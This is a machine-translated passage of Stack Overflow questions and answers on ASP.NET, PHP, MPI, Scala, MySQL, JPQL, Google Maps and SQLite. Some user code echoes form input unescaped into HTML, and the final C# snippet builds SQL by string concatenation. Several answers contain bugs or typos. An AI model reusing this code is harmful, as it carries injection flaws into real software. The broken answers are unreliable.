C:\Windows\Microsoft.NET\Framework\v4.0.30319\Temporary ASP.NET Files 
```

删除整个文件夹的内容（不会造成任何伤害），然后尝试清理并重建您的解决方案。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-01-17T23:46:10.337

**上下文**：我在使用 DevExpress 和 Visual Studio 2012 的 ASP 中遇到了非常相似的问题。问题是我们在服务器中的 \bin 文件夹没有被清除，所以有两个版本的 DevExpress dll v10.1 和 v8.3。

**解决方案**：我刚刚删除了不正确版本的 dll 文件，它可以工作。另一种选择（更好）是删除该目录中的所有文件，并将您的整个文件夹和文件放入一个新的清晰出版物。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-03-16T09:07:01.670

转到您项目的 -> 参考并删除“System.ComponentModel.DataAnnotations”

使用 EntityFramework 就足够了。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-15T15:36:16.573

我对 ASP WCF 服务和 Visual Studio 2010 和新测试版有一个非常相似的问题。如果我编辑服务代码文件（app_code），对我有帮助。添加新行足以强制 VS 重建页面。这个“随机”错误消失了。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-07-24T09:15:03.710

在解决方案资源管理器中右键单击应用程序名称并将其转换为 Web 应用程序。

# java - 生成有效诊断消息的日志记录策略

> ID：10603681
> 
> 赞同：0
> 
> 时间：2012-05-15T15:09:10.467
> 
> 标签：java, exception, log4j, diagnostics

我正在收集想法，欢迎所有建议。

在一个实时复杂的数据处理库中，当抛出一个严重的异常时，我需要生成非常明确和完整的诊断消息。内存打印和 CPU 使用率是一个很大的限制。我有非常复杂的对象图来跟踪。

我阅读了有关 log4j NDC 和 MDC 的信息，但它不适合我的需要。

有任何想法吗 ？

# javascript - .push 进入 for 循环

> ID：10603682
> 
> 赞同：-1
> 
> 时间：2012-05-15T15:09:11.280
> 
> 标签：javascript, jquery

如果满足某些条件，我有以下循环将对象添加到数组中。

```
var form = $('form[id^="product-form"]'),
    submit_button = $('#add-to-cart'),
    attr_fields = $('.additional input[type=text]'),
    attr_fields_default = {};
// Get the default values for each attribute field and place into an obj
attr_fields.each(function () {
    var field = $(this),
        field_id = field.attr('id'),
        field_val = field.val();
    attr_fields_default[field_id] = field_val;
});
var extra_attr = [];
for (var i = 0; i < attr_fields.length; i++) {
    var _field = $(attr_fields[i]);
    if (_field.val() != attr_fields_default[_field.attr('id')]) {
        var jsonStr = {
            'add': _field.attr('id'),
            'quantity': 1
        };
        extra_attr.push(jsonStr);
        console.log(jsonStr);
    } else {
        _field.attr('disabled', 'disabled').val('None');
    }
}
console.log(extra_attr); 
```

代码在最后一个循环之前运行良好，尽管 console.log( jsonStr ) 按预期输出最后一个对象，但 console.log( extra_attr ) 没有。它不会将最后一项推入数组。我什至尝试将 jsonStr 更改为虚拟字符串“test”，但仍然得到相同的结果。

这是我的 chrome 开发者控制台的截图[http://cl.ly/GdHw](http://cl.ly/GdHw)

我还应该注意，我最初尝试使用 .each() 以完全相同的结果遍历选择器

```
 attr_fields
        .each(function(){
          if ( $(this).val() != attr_fields_default[ $(this).attr('id') ] ) {
            var jsonStr = {'add': $(this).attr('id'), 'quantity': 1};
            extra_attr.push( jsonStr );
            console.log( jsonStr );
          } else {
            $(this).attr('disabled', 'disabled').val('None');
          } 
```

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-05-16T15:19:42.020

问题在于稍后在使用 .pop() 获取最后一个元素的代码中的异步调用

# parallel-processing - 如何使用 mpi 将矩阵的行发送到另一个进程？

> ID：10603687
> 
> 赞同：-2
> 
> 时间：2012-05-15T15:09:25.303
> 
> 标签：parallel-processing, mpi

我有一个矩阵 A[10][10]。我想将此矩阵的第一行发送到另一个进程。我该怎么做？

提前致谢..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-17T16:17:56.030

```
Look at these pages: 
```

[http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Recv.html](http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Recv.html) [http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Send.html](http://www.mcs.anl.gov/research/projects/mpi/www/www3/MPI_Send.html)

....示例代码：

```
if(rank==0){
MPI_Send(&A[0][0],10,MPI_DOIBLE,rank+1,tag,MPI_COMM_WORLD);
}
if(rank==1){
MPI_Recv(&A[0][0],10,MPI_DOIBLE,rank-1,tag,MPI_COMM_WORLD,*status);
} 
```

# c# - 将实体框架实体映射到 POCO 并维护层次结构

> ID：10603701
> 
> 赞同：2
> 
> 时间：2012-05-15T15:10:21.167
> 
> 标签：c#, entity-framework, mapping

我刚开始从事一个使用实体框架的项目。以前，该应用程序传递了 EF 实体，并且它们已完全填充，因此每个代码部分都能够访问具有属性的属性中的属性......

我刚刚创建了域实体，我想将 EF 实体映射到这些域实体。它基本上是一个 1-1 映射。这应该怎么做？有一个 T4 模板可以将 EF 实体映射到 POCO，但它只映射一层深度。如果我想访问 Person -> Car -> Engine 怎么办？我应该如何从 EF 结构转到 POCO 结构并在整个层次结构中进行映射？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:20:26.543

您应该使用 AutoMapper 或 ValueInjector 之类的东西。如果您的课程遵循某些约定，那么它工作得很好。如果他们不这样做，您可以定义自定义映射类来为您完成。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:21:04.650

在我看来，您不需要创建另一组域实体。POCO 实体旨在用于所有层（恕我直言）。

但是，如果您想将另一组实体映射到 POCO 实体，只需使用[Automapper](http://automapper.codeplex.com/)即可。它具有映射对象及其属性的能力。

另一方面，使用 POCO 可以访问 Person -> Car -> Engine 链。只需正确地制作“包含”，就不会出现问题。

# php - 将 y 个元素的 x 个列表合并到每个 z 个元素的上限的算法

> ID：10603712
> 
> 赞同：2
> 
> 时间：2012-05-15T15:11:28.017
> 
> 标签：php, algorithm, math, merge

基本上我需要一些适合以下问题的算法：

我有 5 个列表：10、30、40、40 和 50 个元素，每个都有 80 个元素的上限，我现在想要实现的是：3 个列表：10、80 和 80 个元素

40 和 40 合并到 80 和 30 和 50 合并到 80，具有 10 个元素的列表保留为第三个结果列表，这意味着我想以某种方式合并所有列表，但上限为 80 个元素，所以我真的只有那么多列出我真正需要的

这不是排序问题，而只是合并 不可能拆分列表，列表的元素应始终保持在一起

希望你能帮助我，谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:23:12.957

这听起来像是一个[装箱问题](http://en.wikipedia.org/wiki/Bin_packing_problem).. 这是一个 NP 难题，因此如果没有一些启发式方法，您将无法快速实现这一目标。维基百科页面有一些代码可以帮助你——现在你有了它的名字，也许你可以搜索更多。

# asp.net - 可以从 jqGrid 标题中更改展开/折叠按钮图标吗？

> ID：10603719
> 
> 赞同：1
> 
> 时间：2012-05-15T15:11:50.080
> 
> 标签：asp.net, css, jqgrid

首先，我将解释上下文。

我有一个包含 2 个或更多网格 (jqgrid) 的视图，并且想在展开/折叠按钮中添加一个“X”。

我正在尝试并最终获得“X”图标，但在所有网格中，使用以下代码：

```
 .ui-icon-circle-triangle-n
    {
        background-position: -31px -192px !important;
    } 
```

1 - 我怎样才能只更改我想要的网格中展开/折叠按钮的图标？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T16:34:26.167

[jqGrid 在标题层](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:how_it_works)的“关闭”按钮内使用“ui-icon-circle-triangle-n”和“ui-icon-circle-triangle-s”图标。例如，要将“ui-icon-circle-triangle-n”图标更改为“ui-icon-closethick”（请参阅[​​ jQuery UI CSS 框架](http://wiki.jqueryui.com/w/page/12137970/jQuery%20UI%20CSS%20Framework)），您可以执行以下步骤：

1.  您应该直接在创建网格时更改图标的初始值。您想对页面上的所有网格执行此操作，因此您可以执行以下操作

```
$(".ui-jqgrid-titlebar>.ui-jqgrid-titlebar-close>span")
    .removeClass("ui-icon-circle-triangle-n")
    .addClass("ui-icon-closethick"); 
```

1.  `onHeaderClick`您必须在“打开”网格后更改回调内部的图标：

```
onHeaderClick: function (gridstate) {
    if (gridstate === "visible") {
      $(this).closest(".ui-jqgrid-view")
          .find(".ui-jqgrid-titlebar>.ui-jqgrid-titlebar-close>span")
          .removeClass("ui-icon-circle-triangle-n")
          .addClass("ui-icon-closethick");
    }
} 
```

[您可以在演示](http://www.ok-soft-gmbh.com/jqGrid/ChangeCloseIcon.htm)中看到结果：

![在此处输入图像描述](../Images/0fbce36e821b6ea2ef05aa074a5b719a.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T16:34:35.063

假设第一个网格的容器 id 是**grd_asset_container**。你可以用它来定位一个网格

```
#grd_asset_container div.ui-jqgrid-titlebar .ui-icon-circle-triangle-n, #grd_asset_container div.ui-jqgrid-titlebar .ui-icon-circle-triangle-s { background-position: -32px -192px !important; } 
```

# php - 对 php .txt 文件进行数字排序

> ID：10603721
> 
> 赞同：-3
> 
> 时间：2012-05-15T15:11:54.510
> 
> 标签：php, flat-file

我正在尝试使用平面文件创建一个评分系统（我知道，我也更喜欢使用 mysql）。我已经设法创建了足够多的变量，以便将变量从游戏中提取出来（用户名和分数）并放入所述文本文件中。我还可以在格式化表格中输出这个文本文件。但是我无法让分数按任何顺序排序 - 理想情况下我想要降序。在网上搜索后，我能找到的最好的方法是在附加的代码中，但是目前这似乎并没有真正做任何事情。我知道这可能是一个愚蠢的错误，但我可以用一双新的眼睛来看看它。非常感谢，哈利

```
<?php
echo '<table width="5%" border="5"><tr><th>Your Score</th><th>Your Name</th></tr>';
echo '<tr><td>'.$_POST["m_score"].'</td><td>'.$_POST["name"].'</td></tr>';
echo '</table>';
echo "<br />";

$data=$_POST["m_score"].",".$_POST["name"].",";
      $filename = "./highscores.txt";
      $handle = fopen($filename, "a");

      if (!$handle)
      {
           print "There were problems opening the file";
           exit();
      }

      fwrite($handle, $data);
      fclose($handle);

      $handle = fopen($filename, "r");
      $datain = fread($handle, filesize($filename));
      $value = explode(",",$datain);        
      $row = floor(count($value)/2);
      $count = 0;

      $filename = file("./highscores.txt");
      sort($filename);
      file_put_contents("./highscores.txt", implode($filename));

    echo '<table width="5%" border="1"><tr><th>Top Scores</th><th>Top Users</th></tr>';
    for ($i=0;$i<$row;$i++)
    {
        echo '<tr>';
        for($x=0;$x<2;$x++){
            echo "<td>$value[$count]</td>";
            $count++;
        }
        echo "</tr>";
    }
    echo '</table>';

    fclose($handle);

?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:57:54.877

我写了一个你可以学习的例子，如果你真的不想让一个成熟的 mySQL 服务器处理你的数据，那么这里是你如何使用内置的 sqlite2 函数来完成它，超级简单，对任何小数据都非常有用sql 类型总是比平面文件查询更快，插入更容易。希望能帮助到你：

```
<?php
//Create db or return connection
$db = setup('scores.db');

//form so you can enter data
echo '<h1>Put Score demo:</h1>
<form method="POST" action="">
  <p>Name: <input type="text" name="name" size="20"></p>
  <p>Score: <input type="text" name="m_score" size="20"><input type="submit" value="Submit"></p>
</form>';
//Validate score as a number and the name is set
if(isset($_POST['m_score']) && is_numeric($_POST['m_score']) && !empty($_POST['name'])){

    $name = $_POST['name'];
    $m_score = $_POST['m_score'];

    //Put result into database
    database("INSERT INTO scores (id,name , m_score) VALUES (NULL,'".sqlite_escape($name)."',".(int)$m_score.")",'put',$db);

    //Show users score
    echo '<table width="5%" border="5"><tr><th>Your Score</th><th>Your Name</th></tr>';
    echo '<tr><td>'.htmlentities($m_score).'</td><td>'.htmlentities($name).'</td></tr>';
    echo '</table>';
    echo "<br />";

}else{
    //Get Results from database
    $result = database("SELECT DISTINCT name, m_score from scores ORDER BY m_score DESC",'get',$db);

    //Show global score
    echo '<table width="5%" border="1"><tr><th>Top Scores</th><th>Top Users</th></tr>';
    foreach ($result as $row){
        echo '<tr>';
        echo "<td>".htmlentities($row['m_score'])."</td>";
        echo "<td>".htmlentities($row['name'])."</td>";
        echo "</tr>";
    }
    echo '</table>';
}

/**
 * Simple function to setup the sqlite database or return a connection to that db
 *
 * @param string $db_name
 * @return mixed (Connection or setup success)
 */
function setup($db_name){
    global $db;
    if(file_exists($db_name)){
        if(isset($db)){return $db;}
        return sqlite_open($db_name, 0666, $error);
    }
    $db = sqlite_open($db_name, 0666, $error);
    (!$db)?die($error):null;
    //Create new db
    $query ="CREATE TABLE scores (id INTEGER PRIMARY KEY, name TEXT(255), m_score INTEGER)";
    $ok = sqlite_exec($db, $query, $error);
    (!$ok)?die("Cannot execute query. $error"):null;

    echo 'Setup completed, Refresh page.';
    die;
}

/**
 * A simple sqlite CRUD with U & D missing ;p
 *
 * @param (sql query) $query
 * @param (put|get) $do
 * @param (Connection resource) $db
 * @return result
 */
function database($query,$do,$db){
    $error=null;
    $return=null;
    switch($do){
        case "get":
            $result = sqlite_query($db, $query, $error);
            if (!$result) die("Cannot execute query {$query} ". $error);
            $i=0;
            while ($entry = sqlite_fetch_array($result, SQLITE_ASSOC)) {
                foreach($entry as $key=>$value){
                    $return[$i][$key]=$value;
                }
                $i++;
            }
            return $return;
            break;
        case "put":
            $result = sqlite_exec($db, $query, $error);
            if ($result==false){ die("Cannot execute statement {$query} ". $error);}else{ return sqlite_changes($db);}
            break;
        default:
            die("Missing 2nd argument for database function.");
            break;
    }
    return true;
}

/**
 * Function to escape user input for db
 *
 * @param unknown_type $data
 * @return unknown
 */
function sqlite_escape($data) {
    if(is_array($data)){return array_map("sqlite_escape_string", $data);}
    return sqlite_escape_string($data);
}
?> 
```

# c# - NCover：从覆盖范围中排除不可执行的代码行

> ID：10603725
> 
> 赞同：3
> 
> 时间：2012-05-15T15:12:07.333
> 
> 标签：c#, unit-testing, code-coverage, ncover

以下代码中的 switch 语句有一个`default`编译器需要的子句和一个很好的保护措施，但它永远不会被执行。在为其他所有内容编写测试之后，我无法（或应该）测试那一行。我不在乎我没有用测试覆盖这条线，但我的 TestDriven.net NCover 代码覆盖率报告确实显示了未经测试的线，这导致类覆盖率下降到 86%。有没有办法让 NCover 只排除这一行？

```
public static class OperandTypeExtensions
{
    public static string ToShortName(this OperandType type)
    {
        #region Contract
        Contract.Requires<InvalidEnumArgumentException>(Enum.IsDefined(typeof(OperandType), type));
        #endregion

        switch (type)
        {
            case OperandType.None: return "<none>";
            case OperandType.Int32: return "i32";
            case OperandType.Int64: return "i64";
            default:
                throw new NotSupportedException();
        }
    }
} 
```

我的问题与[这个问题](https://stackoverflow.com/questions/3535157/how-do-i-test-code-that-should-never-be-executed)类似，但没有一个答案对我的具体情况有帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:15:58.500

您可以通过将 OperandType 枚举中不存在的整数值转换为 OperandType 来练习它：

```
Assert.Throws<InvalidEnumArgumentException>(delegate { ((OperandType)Int32.MaxValue).ToShortName(); } ); 
```

顺便说一句，我认为 86% 的覆盖率没什么不好

更新：在`Contract`这里使用没有任何好处。如果您的方法不支持值，您无论如何都会得到异常。

```
public static class OperandTypeExtensions
{
    public static string ToShortName(this OperandType type)
    {
        switch (type)
        {
            case OperandType.None: return "<none>";
            case OperandType.Int32: return "i32";
            case OperandType.Int64: return "i64";
            default:
                throw new NotSupportedException();
        }
    }
} 
```

您应该在`default`这里有选项，因为如果将新值添加到`OperandType`枚举中，您`Contract`将允许该值，但 switch 将不支持新选项。

UPDATE2：如果您确实需要此方法的 100% 覆盖率和合同，则使用 OperandType.None 作为默认选项：

```
public static class OperandTypeExtensions
{
    public static string ToShortName(this OperandType type)
    {
        Contract.Requires<InvalidEnumArgumentException>(Enum.IsDefined(typeof(OperandType), type));

        switch (type)
        {
            case OperandType.Int32: return "i32";
            case OperandType.Int64: return "i64";
            default:
                return "<none>";
        }
    }
} 
```

并添加到关于枚举的测试断言：

```
CollectionAssert.AreEquivalent(Enum.GetValues(typeof(OperandType)), 
                               new OperandType[] { OperandType.Int32,
                                                   OperandType.Int64, 
                                                   OperandType.None }); 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-01-23T22:50:09.587

*我还希望我的所有源文件都达到 100%，而不是为了 %，而是为了避免每次运行代码覆盖率工具时都对每个类进行双重检查以发现误报。*

在这种情况下和 IMO 中，如果该**功能是公开**的，则意味着**您应该**使用类似的东西对其进行测试：

```
Assert.Throws<NotSupportedException>( OperandTypeExtensions.ToShortName() ); 
```

* * *

**其他可能发生的情况**

通常，当函数中的`throws`或函数`Debug.Assert`是私有的时，会出现更大的问题。在这种情况下，有时测试无法到达这些线路。或者不能封装在`Assert.Throws`.

我发现确保执行每一行的唯一方法。**远非理想且非常丑陋**，我更喜欢这样的[注释注释](https://stackoverflow.com/a/4917471/62921)来禁用它。虽然在 C# 中不起作用。

```
private string ToShortName(this OperandType type)
{
    var result = "";
    switch (type)
    {
        case OperandType.Int32: result = "i32";
        case OperandType.Int64: result = "i64";
    }
    Debug.Assert(result != "", "Invalid type.");
    return result;
} 
```

使用此解决方案，在您的源代码中它会在返回空字符串（在 Debug 中）之前中断，并且 Code Coverage 将看到 Debug.Assert 行已执行。

*PS虽然，我想知道是否有更好的解决方案，比如注释或专门禁用代码块的东西。*

# coldfusion - CF 10 中的闭包不能调用任何用户定义的函数？为什么？

> ID：10603728
> 
> 赞同：1
> 
> 时间：2012-05-15T15:12:17.080
> 
> 标签：coldfusion, closures, coldfusion-10

> ***注意：***闭包不能调用任何用户定义的函数，因为函数的上下文没有被保留，尽管闭包的上下文被保留了。它给出了错误的结果。例如，当一个闭包被缓存时，它可以被正确地调用以供以后使用，而函数则不能。

引自：[http ://help.adobe.com/en_US/ColdFusion/10.0/Developing/WSe61e35da8d31851842acbba1353e848b35-7ffa.html](http://help.adobe.com/en_US/ColdFusion/10.0/Developing/WSe61e35da8d31851842acbba1353e848b35-7ffa.html)

有人可以详细说明一下吗？为什么闭包不能调用 UDF？

闭包可以调用CF内置函数吗？还是只是用户定义的函数？

我认为理解这一点的局限性至关重要。谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T20:53:00.467

闭包可以调用 CF 内置函数和用户定义函数。CF 的实现没有任何限制，您可以尝试自己验证。

存在的文档说明是由于记录了一个错误（带有预发布），即缓存的闭包实例（例如在应用程序范围内）在执行两次时无法调用 UDF。我相信它是固定的，因此应该删除该注释。

ps 我在 ColdFusion 中研究了闭包的实现

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:17:11.513

> 闭包保留在创建时可见的变量副本。

这基本上是计算机科学中闭包的定义。捕获的环境和一些要在该上下文中评估的代码。

从闭包调用函数的限制似乎是 ColdFusion 中闭包实现中的一个错误——函数无法从闭包捕获的环境中访问它们的环境。

# .net - OAuth 和握手混淆

> ID：10603729
> 
> 赞同：0
> 
> 时间：2012-05-15T15:12:28.923
> 
> 标签：.net, oauth, oauth-2.0

我是 OAuth 的新手，无法将其工作原理的过程可视化。

据我了解，当我尝试通过 OAuth 验证凭据时，我向登录服务器发送了一个请求，该服务器接管并让用户登录网站本身。如果凭据有效，则访问 OAuth 请求的回调 URL，并将令牌附加到回调 URL。此令牌必须与所有未来的 HTTP 请求一起传递给服务器，并用作用户凭据的验证。

我感到困惑的是，如何使这个过程适应没有服务器的桌面应用程序？我将什么用于回调 URL，如果我只是在桌面上运行 .NET 应用程序，如何检索令牌？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T18:59:13.760

这取决于您要支持的服务提供商。

谷歌在这里很好地描述了如何将 OAuth 2.0 与“已安装的应用程序”一起使用： [https ://developers.google.com/accounts/docs/OAuth2InstalledApp](https://developers.google.com/accounts/docs/OAuth2InstalledApp)

一般来说，有几种不同的策略：

1.  执行上述 OAuth 流程 - 使用标准 URL 处理程序弹出浏览器，但要求用户将授权代码从浏览器复制/粘贴回您的应用程序。这需要提供者支持 urn:ietf:wg:oauth:2.0:oob 的 redirect_url。
2.  打开浏览器窗口，并自动从浏览器的标题窗口捕获服务器返回的授权代码，而不需要复制/粘贴。这也需要支持 OOB redirect_url。
3.  在您的应用程序中作为嵌入式浏览器窗口执行 OAuth 请求，并像 #2 中一样捕获授权代码。

如果您的 OAuth 2.0 提供程序不支持 OOB，您还可以重定向到您拥有的 Web 服务器以完成类似的任务。

最大的问题是您这样做是为了身份验证（获取用户身份）还是授权（通过 Web API 访问用户数据）。如果您尝试对用户进行身份验证，则需要一些您可以信任的服务器端逻辑来传递授权代码或访问令牌以进行验证。

# c++ - 关于调用具有专门模板的类的困惑

> ID：10603732
> 
> 赞同：1
> 
> 时间：2012-05-15T15:12:42.280
> 
> 标签：c++, templates, template-specialization

我有一个使用模板并且可以存储多种抽象数据类型 (ADT) 的“存储库”（仓库，您可以随意称呼它）。

**Rep.h**

```
template <typename TAD>
class Repository {
    public:
        DynamicArray <TAD *> tad;  // made a dynamic array myself, also uses templates

        // since one ADT has one of the following two functions and the other doesn't
        // I decided to not use TAD here

        Person *findByName (string name);
        Activities* findByDate(string date);

        void save (TAD &p);
        //etc
} 
```

**Rep.cpp**

```
template <>
void Repository<Person>::save(Person &p) throw (RepositoryException) { 
    @code
}
template <>
void Repository<Activities>::save(Activities& a) throw (RepositoryException) {
    @code
}
//etc 
```

现在我有一个单独处理 ADT 的控制器，所以我想创建一个只反映抽象数据类型“人”的存储库

**我怎么打电话？**（创建一个具有 Person 或 Activity 作为模板的存储库类型的对象......参数？）

**像这样： ？（以下）**

**个人控制器.h**

```
Repository<Person> *repository; 
```

**活动控制器.h**

```
Repository<Activities> *repository; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:37:06.757

您不能链接到模板，因为链接器不能创建特化——编译器需要这样做。您需要将模板（来自 Rep.cpp）放在 Rep.h 文件中，以便编译器可以创建您需要的特化。

# scala - 如何通过删除Scala中的一个元素从列表中获取所有可能的子列表？

> ID：10603733
> 
> 赞同：2
> 
> 时间：2012-05-15T15:12:43.570
> 
> 标签：scala

我有一个列表`List(1,2,3,4)`，并希望通过删除一个元素获得所有子列表：

```
List(2,3,4)
List(1,3,4)
List(1,2,4)
List(1,2,3) 
```

最简单的方法是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:16:17.457

如果您的意思是“将列表中的每个*位置*排除在外”，那么：

```
val x = List(1,2,3,2)

x.indices.map(i => x.take(i) ++ x.drop(i+1))
// List(2, 3, 2)      // skipped index 0
// List(1, 3, 2)      // skipped index 1
// List(1, 2, 2)      // skipped index 2
// List(1, 2, 3)      // skipped index 3 
```

如果您的意思是“将列表中的每个*唯一元素*排除在外”，那么：

```
x.distinct.map(e => x.filter(_ != e))
// List(2, 3, 2)      // filtered out 1s
// List(1, 3)         // filtered out 2s
// List(1, 2, 2)      // filtered out 3s 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T22:11:40.553

```
List(1, 2, 3, 4).combinations(3).toList 
```

或者，更一般地说，

```
list.combinations(list.size - 1) // use the Iterator -- combinations can be huge in size 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T15:35:33.543

我想到了：

```
val x = List(1,2,3,4)
x.map(i => sizes - i) 
```

# mysql - 选择 timestampdiff 超过 1 天并且有一些 null

> ID：10603734
> 
> 赞同：0
> 
> 时间：2012-05-15T15:12:44.447
> 
> 标签：mysql

我有一个带有列的表，`id_user`它可以是有效的or 。它基本上存储是否已发送某些东西。`to_sent``sent_datetime``DATETIME``NULL`

我每 24 小时只能发送 5 个，因此在该查询中，我需要知道哪个`id_user`有**to_sent=1**并且在过去 24 小时内没有发送任何内容。to_sent=1 也可能有一个**sent_datetime=NULL**但我不知道如何处理它。

发送将在稍后进行，只有不同的 id_user 就可以了。

我试过了

```
SELECT id_user
FROM send
WHERE
    to_sent=1
    AND (TIMESTAMPDIFF(DAY, sent_datetime, NOW()) < 1)
GROUP BY id_user
ORDER BY updated_datetime; 
```

但我不会只收到距离上次发送内容超过 24 小时的那些。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:22:38.047

有两件事要检查：

1.  确保处理`sent_datetime`为 null 的情况，否则`TIMESTAMPDIFF`将返回`NULL`. 我不确定这是不是这里的问题。

2.  确保返回的值`TIMESTAMPDIFF`不是负数。如果是这样，则在表达式中反转`NOW()`和。`sent_datetime`

3.  尝试在您的选择语句中添加此表达式，以便您可以看到结果。

所以，你可以试试这个：

```
SELECT id_user, TIMESTAMPDIFF(DAY, sent_datetime, NOW())
FROM send
WHERE
    to_sent=1
    AND (TIMESTAMPDIFF(DAY, sent_datetime, NOW()) < 1)
    AND sent_datetime IS NOT NULL
GROUP BY id_user
ORDER BY updated_datetime; 
```

最后，你需要这个：

```
SELECT id_user
FROM send
WHERE
    to_sent=1
    AND (TIMESTAMPDIFF(DAY, sent_datetime, NOW()) >= 1
         OR sent_datetime IS NULL)
GROUP BY id_user
ORDER BY updated_datetime; 
```

另外，这使得差异的准确性达到了一天。您可能希望将其更改为：`TIMESTAMPDIFF(HOUR, sent_datetime, NOW()) >= 24`或分钟，或其他任何内容。那是如果您想要恰好 24 小时而不是日历中的一天。

# sql - JPQL - 避免使用连接

> ID：10603736
> 
> 赞同：0
> 
> 时间：2012-05-15T15:12:46.880
> 
> 标签：sql, database, join, jpql

我有 3 个表：操作、部门、员工

```
action (
  id
  employee_id
  name
)

employee(
  id
  department_id
)

department (
  id
  name
) 
```

*   action.employee_id 可以为空

我正在使用以下查询：

```
select a.id, a.name, d.name from action a, employee e, department d where         a.employee_id=e.id and e.department_id=d.id 
```

但是在没有employee_id 的操作的情况下，我不会在结果中得到这些行

有没有办法在不使用左连接的情况下克服这个问题？

* * *

到目前为止尝试过（没有用）：

```
select a.id, a.name, d.name from action a, employee e, department d where         (a.employee_id=e.id and e.department_id=d.id) or a.employee_id is null 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:26:01.000

您错过了 JPA 的全部要点：让对象直接与其他对象关联，而不是让对象持有其他对象的 ID。

您应该有一个 Action 实体，该实体与一个 Employee 实体具有多对一关联，而该实体与一个部门实体具有多对一关联。您不应该在 Action 中有一个employeeId 字段。而且您不应该在 Employee 中有一个 departmentId 字段。

例如，这将允许您通过简单地调用来获取操作的部门名称

```
action.getEmployee().getDepartment().getName() 
```

您将能够在查询中使用左连接，这将成为

```
select a.id, a.name, d.name
from Action a
left join a.employee e
left join e.department d 
```

会给你预期的结果

# java - 使用 Google API 获得多个位置之间的最佳路径

> ID：10603738
> 
> 赞同：1
> 
> 时间：2012-05-15T15:12:54.677
> 
> 标签：java, android, navigation, maps, google-api

我正在寻找使用任何 Google API 或框架命名空间的某种方式，`android`以获取.`optimized``multiple` `locations`

例如，我们`locations`在美国有几个：洛杉矶、纽约、旧金山、华盛顿、圣何塞。订单很糟糕，我们不会从洛杉矶到纽约然后再回到旧金山和 SJ。

我在某处看到`Google Maps API V3`了获得优化订单的一些非官方方式。

有没有可能通过专门使用`Java`和`Android`/或 Google API 来做到这一点？

非常感谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:57:26.370

您是否看到任何 Location 都有方法[distanceTo(Location)](http://developer.android.com/reference/android/location/Location.html#distanceTo%28android.location.Location%29)？

你可以像这样编写一个简单的 Comarator：

```
public class LocationComparator implements Comparator<Location>{
    @Override
    public int compare(Location object1, Location object2) {
        return (int)object1.distanceTo(object2);
    }
} 
```

未经测试，比较不会返回负值，但它应该可以工作。然后，您可以使用

```
Collections.sort(locationCollection, new LocationComparator()); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-24T18:09:15.110

我正面临这个网站，也许对你有帮助。它是用于测量多个位置之间的最佳路径的在线工具。

[http://gebweb.net/optimap/](http://gebweb.net/optimap/)

当然，我正在寻找可以计算多个目的地之间最佳距离的东西（旅行推销员问题）。

祝你好运

# javascript - 我已经为我的谷歌地图定义了我的指针图像和指针位置。为什么不显示？

> ID：10603745
> 
> 赞同：1
> 
> 时间：2012-05-15T15:13:33.320
> 
> 标签：javascript, google-maps, google-maps-api-3

这是我的代码： http: [//pastie.org/3915628](http://pastie.org/3915628)

在第 25 行，我定义了指针的图像。在第 32 行，对于函数 GMarker 的第二个参数，我已经定义了我的标记点。

为什么我的标记没有出现？我错过了什么吗？我对使用谷歌地图完全陌生。

我很抱歉没有在这里粘贴代码，但我不明白缩进规则。我什至在 sublime 中缩进了我的所有代码并直接将其粘贴到这里，但它只是“代码阻塞”了其中的一部分。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:19:02.540

看起来您正在混合版本 2 和版本 3 代码。对标记使用版本 3 代码，因为不再支持 V2：

```
 var marker = new google.maps.Marker({
    map: map,
    position: new google.maps.LatLng(-34.397, 150.644),
    icon: "http://maps.google.com/mapfiles/kml/pal3/icon31.png",
    shadow: "http://maps.google.com/mapfiles/kml/pal3/icon31s.png"
  }); 
```

关于缩进，我所做的是突出显示整个粘贴的代码并单击工具栏中的`{ }`图标。任何缩进四个或更多空格的内容都将显示为代码。不过，可能有更好的缩进方式

# c# - 我遇到异常“无法打开数据库文件”如何解决

> ID：10603747
> 
> 赞同：-1
> 
> 时间：2012-05-15T15:13:38.893
> 
> 标签：c#, database, sqlite

这里我使用的是 sqlite 数据库。代码在这里：

```
using (SQLiteCommand cmd = new SQLiteCommand(query, conn))
{
    conn.Open();
    cmd.ExecuteNonQuery();

    cmd.CommandText = 
         "insert into users(name, password, priviledges) values(" +
          "'" + UsernameText.Text.Trim() + "', " + "'" + 
         QuickMethods.MD5(PasswordText.Password.Trim()) + "', " + "524287" + ")";
    cmd.ExecuteNonQuery();

    cmd.CommandText = "INSERT INTO company VALUES('name','" + CompanyName.Text.Trim() + "');";
    cmd.ExecuteNonQuery();

